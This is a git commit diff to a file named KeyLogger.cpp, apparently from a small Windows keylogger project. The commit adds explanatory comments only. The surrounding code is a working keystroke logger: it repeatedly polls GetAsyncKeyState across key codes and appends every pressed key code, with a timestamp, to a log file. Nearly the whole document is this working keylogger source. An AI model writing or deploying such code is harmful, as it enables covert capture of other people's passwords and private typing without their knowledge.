1cfe525417cc3938cd4ef7fb364b76ca703a6fc7
Minhas Kamal <minhaskamal024@gmail.com>
2016-07-15 11:18:58 +0600

    Update KeyLogger.cpp

--- KeyLogger.cpp
+++ KeyLogger.cpp
@@ -18,21 +18,21 @@ main(){
     FILE *file = fopen(FILE_NAME, "a");  //open or create a file
 
     time_t date = time(NULL);   //write time and date in file
-    fprintf(file, "0\n%s\t", ctime(&date));
+    fprintf(file, "0\n%s\t", ctime(&date)); //writing an extra '0' before every start which is used during decoding
     fclose(file);
 
     unsigned short ch, i;
     while(1){
         ch=1;
         while(ch<250){
-            for(i=0; i<50; i++, ch++){
+            for(i=0; i<50; i++, ch++){  //this strange and extra loop provides more effectiveness and efficiency
                 if(GetAsyncKeyState(ch) == -32767){ //when key is stroke
                     file=fopen(FILE_NAME, "a");
                     fprintf(file, "%d ", ch);
                     fclose(file);
                 }
             }
-            Sleep(1);   //take rest
+            Sleep(1);   //this little sleep inhibids the program from taking full processor cycle
         }
     }
 }
